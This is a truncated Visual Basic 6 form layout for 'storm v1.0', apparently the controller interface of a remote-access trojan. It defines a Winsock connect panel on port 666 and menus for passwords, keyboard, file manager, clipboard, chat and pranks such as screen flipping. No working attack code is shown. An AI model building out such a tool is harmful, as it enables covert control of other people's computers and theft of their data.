VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmMain 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "storm v1.0"
   ClientHeight    =   5820
   ClientLeft      =   4875
   ClientTop       =   3075
   ClientWidth     =   5535
   BeginProperty Font 
      Name            =   "OCR A Extended"
      Size            =   9
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmMain.frx":0000
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form1"
   ScaleHeight     =   5820
   ScaleWidth      =   5535
   StartUpPosition =   2  'CenterScreen
   Begin VB.PictureBox statusbar 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   210
      Left            =   240
      ScaleHeight     =   210
      ScaleWidth      =   930
      TabIndex        =   145
      Top             =   5520
      Width           =   930
      Begin VB.PictureBox picleft 
         AutoRedraw      =   -1  'True
         BackColor       =   &H00FFFFFF&
         BorderStyle     =   0  'None
         Height          =   330
         Left            =   1000
         ScaleHeight     =   330
         ScaleWidth      =   930
         TabIndex        =   147
         Top             =   0
         Width           =   930
      End
      Begin VB.PictureBox Picright 
         AutoRedraw      =   -1  'True
         BackColor       =   &H00FFFFFF&
         BorderStyle     =   0  'None
         Height          =   330
         Left            =   -1000
         ScaleHeight     =   330
         ScaleWidth      =   930
         TabIndex        =   146
         Top             =   0
         Width           =   930
      End
   End
   Begin VB.Timer tmrright 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   960
      Top             =   4680
   End
   Begin VB.Timer tmrleft 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   360
      Top             =   4680
   End
   Begin MSComDlg.CommonDialog cdlg 
      Left            =   360
      Top             =   3360
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.PictureBox Picture10 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Left            =   120
      ScaleHeight     =   315
      ScaleWidth      =   1395
      TabIndex        =   29
      Top             =   2160
      Width           =   1400
      Begin VB.PictureBox Picture5 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   0
         ScaleHeight     =   315
         ScaleWidth      =   1395
         TabIndex        =   42
         Top             =   0
         Width           =   1400
         Begin VB.Label cmdXtra 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "extra fun"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   220
            Left            =   40
            TabIndex        =   43
            Top             =   45
            Width           =   1305
         End
         Begin VB.Shape Shape6 
            BorderColor     =   &H00FF8080&
            Height          =   290
            Left            =   15
            Top             =   15
            Width           =   1370
         End
      End
      Begin VB.Label lblextra 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "extra"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   15
         TabIndex        =   144
         Top             =   1260
         Width           =   420
      End
      Begin VB.Label lbltime 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "time/date"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   15
         TabIndex        =   33
         Top             =   1040
         Width           =   705
      End
      Begin VB.Label lblmouse 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "mouse"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   15
         TabIndex        =   32
         Top             =   810
         Width           =   555
      End
      Begin VB.Label lblrestart 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "restart win"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   15
         TabIndex        =   31
         Top             =   580
         Width           =   825
      End
      Begin VB.Label lblscreensave 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "screen saver"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   15
         TabIndex        =   30
         Top             =   360
         Width           =   975
      End
   End
   Begin VB.PictureBox Picture9 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   320
      Left            =   120
      ScaleHeight     =   315
      ScaleWidth      =   1395
      TabIndex        =   23
      Top             =   1800
      Width           =   1400
      Begin VB.PictureBox Picture4 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   0
         ScaleHeight     =   315
         ScaleWidth      =   1395
         TabIndex        =   40
         Top             =   0
         Width           =   1400
         Begin VB.Label cmdFun 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "fun"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   220
            Left            =   40
            TabIndex        =   41
            Top             =   45
            Width           =   1305
         End
         Begin VB.Shape Shape5 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   10
            Width           =   1365
         End
      End
      Begin VB.Shape shpfun 
         BorderColor     =   &H00FF8080&
         Height          =   1140
         Left            =   0
         Top             =   340
         Visible         =   0   'False
         Width           =   975
      End
      Begin VB.Label lblbrowser 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "browser"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   15
         TabIndex        =   28
         Top             =   820
         Width           =   705
      End
      Begin VB.Label lblprint 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "print"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   0
         TabIndex        =   27
         Top             =   1050
         Width           =   435
      End
      Begin VB.Label lblflip 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "flip screen"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   0
         TabIndex        =   26
         Top             =   600
         Width           =   825
      End
      Begin VB.Label lbldesktop 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "desktop"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   15
         TabIndex        =   25
         Top             =   360
         Width           =   615
      End
      Begin VB.Label lblwincolour 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "win colours"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   15
         TabIndex        =   24
         Top             =   1270
         Width           =   945
      End
   End
   Begin VB.PictureBox Picture7 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Left            =   120
      ScaleHeight     =   315
      ScaleWidth      =   1395
      TabIndex        =   15
      Top             =   1080
      Width           =   1400
      Begin VB.PictureBox Picture2 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   320
         Left            =   0
         ScaleHeight     =   315
         ScaleWidth      =   1395
         TabIndex        =   36
         Top             =   0
         Width           =   1400
         Begin VB.Label cmdKey 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "keys/messages"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   220
            Left            =   40
            TabIndex        =   37
            Top             =   45
            Width           =   1305
         End
         Begin VB.Shape Shape3 
            BorderColor     =   &H00FF8080&
            Height          =   290
            Left            =   15
            Top             =   15
            Width           =   1370
         End
      End
      Begin VB.Label lblkeyboard 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "keyboard"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   15
         TabIndex        =   19
         Top             =   380
         Width           =   735
      End
      Begin VB.Label lblchat 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "chat"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   15
         TabIndex        =   18
         Top             =   600
         Width           =   375
      End
      Begin VB.Label lblmatrix 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "matrix"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   15
         TabIndex        =   17
         Top             =   840
         Width           =   540
      End
      Begin VB.Label lblmsg 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "msg manager"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   15
         TabIndex        =   16
         Top             =   1080
         Width           =   1065
      End
      Begin VB.Shape shpkey 
         BorderColor     =   &H00FF8080&
         Height          =   1035
         Left            =   0
         Top             =   360
         Visible         =   0   'False
         Width           =   1095
      End
   End
   Begin VB.PictureBox Picture8 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Left            =   120
      ScaleHeight     =   315
      ScaleWidth      =   1395
      TabIndex        =   14
      Top             =   1440
      Width           =   1400
      Begin VB.PictureBox Picture3 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   320
         Left            =   0
         ScaleHeight     =   315
         ScaleWidth      =   1395
         TabIndex        =   38
         Top             =   0
         Width           =   1400
         Begin VB.Label cmdMisc 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "miscellaneous"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   220
            Left            =   40
            TabIndex        =   39
            Top             =   45
            Width           =   1305
         End
         Begin VB.Shape Shape4 
            BorderColor     =   &H00FF8080&
            Height          =   290
            Left            =   15
            Top             =   15
            Width           =   1370
         End
      End
      Begin VB.Label lblclipmngr 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "clipboard manager"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   0
         TabIndex        =   22
         Top             =   840
         Width           =   1455
      End
      Begin VB.Label lblfilemngr 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "file manager"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   15
         TabIndex        =   21
         Top             =   600
         Width           =   1005
      End
      Begin VB.Label lblpassword 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "passwords"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   15
         TabIndex        =   20
         Top             =   360
         Width           =   960
      End
   End
   Begin VB.PictureBox Picture6 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Left            =   120
      ScaleHeight     =   315
      ScaleWidth      =   1395
      TabIndex        =   10
      Top             =   720
      Width           =   1400
      Begin VB.PictureBox Picture1 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   320
         Left            =   0
         ScaleHeight     =   315
         ScaleWidth      =   1395
         TabIndex        =   34
         Top             =   0
         Width           =   1395
         Begin VB.Label cmdConnect 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "connection"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   220
            Left            =   40
            TabIndex        =   35
            Top             =   45
            Width           =   1305
         End
         Begin VB.Shape Shape2 
            BorderColor     =   &H00FF8080&
            Height          =   290
            Left            =   15
            Top             =   15
            Width           =   1370
         End
      End
      Begin VB.Shape shpConnection 
         BorderColor     =   &H00FF8080&
         Height          =   705
         Left            =   0
         Top             =   360
         Visible         =   0   'False
         Width           =   1095
      End
      Begin VB.Label lblGetinfo 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "get info"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   15
         TabIndex        =   13
         Top             =   380
         Width           =   585
      End
      Begin VB.Label lblServer 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "server options"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   15
         TabIndex        =   12
         Top             =   600
         Width           =   1065
      End
      Begin VB.Label lblIpnotify 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "ip notify"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   40
         TabIndex        =   11
         Top             =   840
         Width           =   585
      End
   End
   Begin MSWinsockLib.Winsock WS 
      Left            =   600
      Top             =   4080
      _ExtentX        =   741
      _ExtentY        =   741
   End
   Begin VB.PictureBox picConnect 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   320
      Left            =   4320
      ScaleHeight     =   315
      ScaleWidth      =   975
      TabIndex        =   8
      Top             =   325
      Width           =   975
      Begin VB.Label lblConnect 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "connect"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   220
         Left            =   40
         TabIndex        =   9
         Top             =   45
         Width           =   880
      End
      Begin VB.Shape Shape1 
         BorderColor     =   &H00FF8080&
         Height          =   290
         Left            =   15
         Top             =   15
         Width           =   945
      End
   End
   Begin VB.TextBox txtPort 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000005&
      Height          =   260
      Left            =   3240
      TabIndex        =   5
      Text            =   "666"
      Top             =   350
      Width           =   855
   End
   Begin VB.TextBox txtIp 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000005&
      Height          =   260
      Left            =   1200
      TabIndex        =   4
      Text            =   "127.0.0.1"
      Top             =   350
      Width           =   1455
   End
   Begin VB.PictureBox picnotify 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   4335
      Left            =   1680
      ScaleHeight     =   4305
      ScaleWidth      =   3705
      TabIndex        =   52
      Top             =   840
      Visible         =   0   'False
      Width           =   3735
      Begin VB.Label Label2 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "function not implemented yet!! i'm working on it!!"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   585
         Left            =   480
         TabIndex        =   53
         Top             =   600
         Width           =   2565
      End
   End
   Begin VB.PictureBox picinfo 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   4335
      Left            =   1680
      ScaleHeight     =   4305
      ScaleWidth      =   3705
      TabIndex        =   48
      Top             =   840
      Visible         =   0   'False
      Width           =   3735
      Begin VB.TextBox txtInfo 
         Appearance      =   0  'Flat
         BackColor       =   &H80000006&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   3255
         Left            =   0
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         TabIndex        =   51
         Text            =   "frmMain.frx":1042
         Top             =   0
         Width           =   3615
      End
      Begin VB.PictureBox Picture12 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   1440
         ScaleHeight     =   315
         ScaleWidth      =   975
         TabIndex        =   49
         Top             =   3480
         Width           =   975
         Begin VB.Shape Shape7 
            BorderColor     =   &H00FF8080&
            Height          =   290
            Left            =   15
            Top             =   15
            Width           =   945
         End
         Begin VB.Label lblretrieve 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "retrieve"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   220
            Left            =   40
            TabIndex        =   50
            Top             =   45
            Width           =   880
         End
      End
   End
   Begin VB.PictureBox picserver 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   4335
      Left            =   1680
      ScaleHeight     =   4305
      ScaleWidth      =   3705
      TabIndex        =   45
      Top             =   840
      Visible         =   0   'False
      Width           =   3735
      Begin VB.PictureBox picclose 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   360
         ScaleHeight     =   315
         ScaleWidth      =   1575
         TabIndex        =   46
         Top             =   600
         Width           =   1575
         Begin VB.Shape Shape8 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   1545
         End
         Begin VB.Label lblclose 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "close server"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   45
            TabIndex        =   47
            Top             =   45
            Width           =   1485
         End
      End
   End
   Begin VB.PictureBox picmatrix 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   4335
      Left            =   1680
      ScaleHeight     =   4305
      ScaleWidth      =   3705
      TabIndex        =   66
      Top             =   840
      Visible         =   0   'False
      Width           =   3735
      Begin VB.PictureBox Picture17 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   720
         ScaleHeight     =   315
         ScaleWidth      =   2295
         TabIndex        =   69
         Top             =   2760
         Width           =   2295
         Begin VB.Label lbldeactivate 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "deactivate the matrix"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   45
            TabIndex        =   70
            Top             =   45
            Width           =   2205
         End
         Begin VB.Shape Shape15 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   2265
         End
      End
      Begin VB.PictureBox Picture16 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   720
         ScaleHeight     =   315
         ScaleWidth      =   2295
         TabIndex        =   67
         Top             =   2280
         Width           =   2295
         Begin VB.Shape Shape14 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   2265
         End
         Begin VB.Label lblactivate 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "activate the matrix"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   45
            TabIndex        =   68
            Top             =   45
            Width           =   2205
         End
      End
      Begin VB.PictureBox Picture19 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         Height          =   1575
         Left            =   600
         Picture         =   "frmMain.frx":1101
         ScaleHeight     =   1575
         ScaleWidth      =   2415
         TabIndex        =   148
         Top             =   480
         Width           =   2415
      End
   End
   Begin VB.TextBox txtwelcome 
      Alignment       =   2  'Center
      BackColor       =   &H00800000&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000005&
      Height          =   2655
      Left            =   1680
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      TabIndex        =   44
      Text            =   "frmMain.frx":E2143
      Top             =   840
      Width           =   3615
   End
   Begin VB.PictureBox picprint 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   4695
      Left            =   1560
      ScaleHeight     =   4665
      ScaleWidth      =   3945
      TabIndex        =   119
      Top             =   720
      Visible         =   0   'False
      Width           =   3975
      Begin VB.Timer tmrsizedown 
         Enabled         =   0   'False
         Interval        =   150
         Left            =   2520
         Top             =   1440
      End
      Begin VB.Timer tmrsizeup 
         Enabled         =   0   'False
         Interval        =   150
         Left            =   2520
         Top             =   960
      End
      Begin VB.PictureBox picprinttext 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   1200
         ScaleHeight     =   315
